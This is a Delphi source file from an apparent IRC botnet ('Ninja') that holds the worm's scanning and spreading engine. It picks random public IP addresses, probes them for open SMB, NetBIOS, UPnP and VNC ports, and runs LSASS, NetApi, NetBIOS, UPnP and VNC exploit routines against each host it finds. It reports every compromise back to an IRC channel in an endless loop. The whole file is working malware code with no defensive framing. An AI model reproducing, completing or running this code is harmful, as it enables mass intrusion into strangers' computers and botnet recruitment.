unit untScanner;

interface

uses
  Windows,
  Winsock,
  untFunctions,
  untGlobalDeclare,
  untOutputs,
  untThreads;

  {$I Ninja.ini}

const
  maxscanthreads = 500;

type
  tadvscaninfo = record
    address     :string;
    port        :string;
    delay       :integer;
    sock        :tsocket;
    portscan    :boolean;
  end;
  padvscaninfo = ^tadvscaninfo;

var
  current_scan_ip       :string;
  current_scan_count    :integer;
  current_scan_exploit  :integer;
  showtries             :boolean;

  globaladvscaninfo     :tadvscaninfo;

  already_scanned       :array[0..1024] of string;

  function scan_advscan(p: pointer): dword; stdcall;
  function scan_advportopen(address, port, delay, protocol: integer; var _sock: tsocket): boolean;
  function scan_status(sock: tsocket): string;
  function scan_calcip(address: string): string;
  function scan_advnextip(var host: string): string;
  function scan_advrandomip: string;
  function scan_scanned(ip:string):boolean;

implementation

uses
  untBot,
  exNetApi,
  upnp_spreader,
  exNetBios,
  exPNP,
  untNetBios,
  lsass2_spreader,
  exVNC;

function scan_scanned(ip:string):boolean;
var
  i     :integer;
begin
  result := false;
  for i := 0 to 1024 do
    if already_scanned[i] = ip then
    begin
      result := true;
      break;
    end;

  if not result then
  begin
    move(already_scanned[0], already_scanned[1], 1023);
    already_scanned[0] := ip;
  end;
end;

function scan_advrandomip: string;
begin
  randomize;

  result := inttostr(random(222)+1) + '.' +
            inttostr(random(254)+1) + '.' +
            inttostr(random(254)+1) + '.' +
            inttostr(random(254)+1);
end;

function scan_advnextip(var host: string): string;
var
  addr  :tsockaddrin;
  dhost :dword;
begin
  dhost := inet_addr(pchar(host));
  dhost := ntohl(dhost);
  inc(dhost);
  dhost := htonl(dhost);
  addr.sin_addr.S_addr := dhost;
  result := inet_ntoa(addr.sin_addr);
  host := result;
end;

function scan_calcip(address: string): string;
var
  i     :integer;
  host  :string;
begin
  repeat
    host := '';
    randomize;

    for i := 1 to length(address) do
      if (address[i] = 'x') or (address[i] = 'X') then
         host := host + inttostr(random(255))
      else if address[i] = '*' then
         host := host + inttostr(random(10))
      else
         host := host + address[i];

    result := host;
  until (result <> current_scan_ip) and
        (copy(result, 1, 3) <> '127') and
        (copy(result, 1, 3) <> '192');
  current_scan_ip := result;
end;

function scan_status(sock: tsocket): string;
begin
  if GlobalAdvScanInfo.address = '' then
    GlobalAdvScanInfo.address := 'none';
  result := '%pm% '+g_irc_channel+' :[info] scanning '+GlobalAdvScanInfo.address+'. '+
            'scanned '+inttostr(current_scan_count)+'. '+
            'exploited '+inttostr(current_scan_exploit)+'. '+
            'scanning '+current_scan_ip+#10;
  result := ninja_replaceshortcuts(result);
  outputadd(sock, result, 1000);
end;
                
function scan_advportopen(address, port, delay, protocol: integer; var _sock: tsocket): boolean;
var
  sock          :tsocket;
  addr          :tsockaddrin;
  wsa           :twsadata;
  blockcmd      :integer;
  timeout       :ttimeval;
  fdset         :tfdset;
  i             :integer;
begin
  result := false;
  //wsastartup($101, wsa);
  blockcmd := 1;

  sock := socket(af_inet, sock_stream, protocol);
  if sock = invalid_socket then exit;

  addr.sin_family := af_inet;
  addr.sin_port := htons(port);
  addr.sin_addr.S_addr := address;

  ioctlsocket(sock, fionbio, blockcmd);
  connect(sock, addr, sizeof(addr));

  timeout.tv_sec := delay;
  timeout.tv_usec := 0;
  fd_zero(fdset);
  fd_set(sock, fdset);

  i := select(0, nil, @fdset, nil, @timeout);

  if i > 0 then
  begin
    _sock := sock;
    result := true;
  end else
    closesocket(sock);

  //wsacleanup();
end;

function scan_advscan(p: pointer): dword; stdcall;
var
  output        :string;
  host          :string;
  address       :string;
  port          :string;

  sock          :tsocket;
  ssock         :tsocket;
  delay         :integer;
  ports         :array[0..7] of integer;
  portcount     :integer;
  iloop         :integer;
  jloop         :integer;

  portscan      :boolean;
  exploit       :boolean;

  wsa           :twsadata;
  lerror        :string;
begin
  address := padvscaninfo(p)^.address;
  delay := padvscaninfo(p)^.delay;
  sock := padvscaninfo(p)^.sock;
  portscan := padvscaninfo(p)^.portscan;
  port := padvscaninfo(p)^.port;

  portcount := 0;
  for jloop := 1 to length(port) do
    if port[jloop] = ',' then
      inc(portcount)
    else
      ports[portcount] := strtoint(inttostr(ports[portcount]) + port[jloop]);

  repeat
    host := scan_calcip(address);
    current_scan_ip := host;

    //wsastartup($101, wsa);
    for iloop := 0 to portcount do
    begin
//      if (ports[iloop] > 0) then
//      if (not scan_scanned(host+':'+inttostr(ports[iloop]))) then
//      begin
        inc(current_scan_count);
        if (scan_advportopen(inet_addr(pchar(host)), ports[iloop], delay, 0, ssock)) then //or
         //(scan_advportopen(inet_addr(pchar(host)), ports[iloop], delay, IPPROTO_TCP)) then
        begin
        output := '';
        exploit := false;
        lerror := '';

        port := '';
        case ports[iloop] of
          21  :port := '(21) ftp';
          80  :port := '(80) http';
          135 :port := '(135) dcom';
          139 :port := '(139) netbios, ms06-040, lsass2';
          445 :port := '(445) netbios, lsass';
          5000:port := '(5000) upnp';
          5900:port := '(5900) vnc';
        end;
        if port = '' then port := 'unknown:'+inttostr(ports[iloop]);

        if showtries then
        begin
          if portscan then
            output := '%pm% '+g_irc_channel+' :[portscan] found '+host+':'+inttostr(ports[iloop])+' ('+port+')'#10
          else
            output := '%pm% '+g_irc_channel+' :[scanner] trying to exploit '+host+':'+inttostr(ports[iloop])+' ('+port+')'#10;
          output := ninja_replaceshortcuts(output);
          outputadd(sock, output, 1000);
        end;

        if portscan then
        begin
          if not showtries then
          begin
            output := '%pm% '+g_irc_channel+' :[portscan] open port at '+host+':'+inttostr(ports[iloop])+' ('+port+')'#10;
            output := ninja_replaceshortcuts(output);
            outputadd(sock, output, 1000);
          end;
        end else
        begin
          output := '';
          exploit := false;
          case ports[iloop] of
            139: begin
                   //* lsass2 *//
                   If LSASSRoot(Host, True, ssock, lerror) Then
                   Begin
                     output := '%pm% '+g_irc_channel+' :[lsass2:xp:139] exploited ' + Host + #10;
                     output := ninja_replaceshortcuts(output);
                     outputadd(sock, output, 1000);
                     inc(current_scan_exploit);
                   End Else
                   If LSASSRoot(Host, False, ssock, lerror) Then
                   Begin
                     output := '%pm% '+g_irc_channel+' :[lsass2:2k:139] exploited ' + Host + #10;
                     output := ninja_replaceshortcuts(output);
                     outputadd(sock, output, 1000);
                     inc(current_scan_exploit);
                   End Else
                   Begin
                     output := '%pm% '+g_irc_channel+' :[lsass2:139] failed to exploit ' + Host + ' [error: '+lerror+']'#10;
                     output := ninja_replaceshortcuts(output);
                     if showtries then
                       outputadd(sock, output, 1000);
                   End;


                   //* netapi *//
                   If doNetApi(Host, Ports[iLoop], ssock, lerror) Then
                   Begin
                     output := '%pm% '+g_irc_channel+' :[netapi:139] exploited ' + Host + #10;
                     output := ninja_replaceshortcuts(output);
                     outputadd(sock, output, 1000);
                     inc(current_scan_exploit);
                   End Else
                   Begin
                     output := '%pm% '+g_irc_channel+' :[netapi:139] failed to exploit ' + Host + ' [error: '+lerror+']'#10;
                     output := ninja_replaceshortcuts(output);
                     if showtries then
                       outputadd(sock, output, 1000);
                   End;

                   //* netbios *//
                   If NetBios(Host, ssock) Then
                   Begin
                     output := '%pm% '+g_irc_channel+' :[netbios:139] exploited ' + Host + #10;
                     output := ninja_replaceshortcuts(output);
                     outputadd(sock, output, 1000);
                     inc(current_scan_exploit);
                   End Else
                   Begin
                     output := '%pm% '+g_irc_channel+' :[netbios:139] failed to exploit ' + Host + #10;
                     output := ninja_replaceshortcuts(output);
                     if showtries then
                       outputadd(sock, output, 1000);
                   End;

                   //* netbios *//
                   If netbios_enumshare(Host) Then
                   Begin
                     output := '%pm% '+g_irc_channel+' :[netbios:139] exploited ' + Host + #10;
                     output := ninja_replaceshortcuts(output);
                     outputadd(sock, output, 1000);
                     inc(current_scan_exploit);
                   End Else
                   Begin
                     output := '%pm% '+g_irc_channel+' :[netbios:139] failed to exploit ' + Host + #10;
                     output := ninja_replaceshortcuts(output);
                     if showtries then
                       outputadd(sock, output, 1000);
                   End;
                 end;
            5900:begin
                   //* vnc *//
                   if _vnc(host, ssock, lerror) then
                   Begin
                     output := '%pm% '+g_irc_channel+' :[vnc:5900] exploited ' + Host + ' [' + lerror + ']'#10;
                     output := ninja_replaceshortcuts(output);
                     outputadd(sock, output, 1000);
                     inc(current_scan_exploit);
                   End Else
                   Begin
                     output := '%pm% '+g_irc_channel+' :[vnc:5900] failed to exploit ' + Host + ' [error: '+lerror+']'#10;
                     output := ninja_replaceshortcuts(output);
                     if showtries then
                       outputadd(sock, output, 1000);
                   End;
                 end;
            5000:begin

                   //* pnp *//
                   If DoUPNP(Host, ssock, lerror) Then
                   Begin
                     output := '%pm% '+g_irc_channel+' :[upnp:5000] exploited ' + Host + #10;
                     output := ninja_replaceshortcuts(output);
                     outputadd(sock, output, 1000);
                     inc(current_scan_exploit);
                   End Else
                   Begin
                     output := '%pm% '+g_irc_channel+' :[upnp:5000] failed to exploit ' + Host + ' [error: '+lerror+']'#10;
                     output := ninja_replaceshortcuts(output);
                     if showtries then
                       outputadd(sock, output, 1000);
                   End;

                   //* pnp *//
                   If _pnp(Host, ssock, lerror) Then
                   Begin
                     output := '%pm% '+g_irc_channel+' :[upnp:5000:new] exploited ' + Host + #10;
                     output := ninja_replaceshortcuts(output);
                     outputadd(sock, output, 1000);
                     inc(current_scan_exploit);
                   End Else
                   Begin
                     output := '%pm% '+g_irc_channel+' :[upnp:5000:new] failed to exploit ' + Host + ' [error: '+lerror+']'#10;
                     output := ninja_replaceshortcuts(output);
                     if showtries then
                       outputadd(sock, output, 1000);
                   End;
                 end;
            445: begin
                   //* netapi *//
                   If doNetApi(Host, Ports[iLoop], ssock, lerror) Then
                   Begin
                     output := '%pm% '+g_irc_channel+' :[netapi:445] exploited ' + Host + #10;
                     output := ninja_replaceshortcuts(output);
                     outputadd(sock, output, 1000);
                     inc(current_scan_exploit);
                   End Else
                   Begin
                     output := '%pm% '+g_irc_channel+' :[netapi:445] failed to exploit ' + Host + ' [error: '+lerror+']'#10;
                     output := ninja_replaceshortcuts(output);
                     if showtries then
                       outputadd(sock, output, 1000);
                   End;

                   //* pnp *//
                   If DoUPNP(Host, ssock, lerror) Then
                   Begin
                     output := '%pm% '+g_irc_channel+' :[upnp:445] exploited ' + Host + #10;
                     output := ninja_replaceshortcuts(output);
                     outputadd(sock, output, 1000);
                     inc(current_scan_exploit);
                   End Else
                   Begin
                     output := '%pm% '+g_irc_channel+' :[upnp:445] failed to exploit ' + Host + ' [error: '+lerror+']'#10;
                     output := ninja_replaceshortcuts(output);
                     if showtries then
                       outputadd(sock, output, 1000);
                   End;

                   //* netbios *//
                   If NetBios(Host, ssock) Then
                   Begin
                     output := '%pm% '+g_irc_channel+' :[netbios:445] exploited ' + Host + #10;
                     output := ninja_replaceshortcuts(output);
                     outputadd(sock, output, 1000);
                   End Else
                   Begin
                     output := '%pm% '+g_irc_channel+' :[netbios:445] failed to exploit ' + Host + #10;
                     output := ninja_replaceshortcuts(output);
                     if showtries then
                       outputadd(sock, output, 1000);
                   End;

                   //* netbios *//
                   If netbios_enumshare(Host) Then
                   Begin
                     output := '%pm% '+g_irc_channel+' :[netbios:445] exploited ' + Host + #10;
                     output := ninja_replaceshortcuts(output);
                     outputadd(sock, output, 1000);
                   End Else
                   Begin
                     output := '%pm% '+g_irc_channel+' :[netbios:445] failed to exploit ' + Host + #10;
                     output := ninja_replaceshortcuts(output);
                     if showtries then
                       outputadd(sock, output, 1000);
                   End;
                 end;
          end;

        end;
          if ssock <> invalid_socket then
            closesocket(ssock);
        end;
//        end;
//      if ports[iloop] <> 0 then
//      begin
//        wsacleanup;
//        inc(current_scan_count);
//      end;
    end;
  until false;
end;

end.

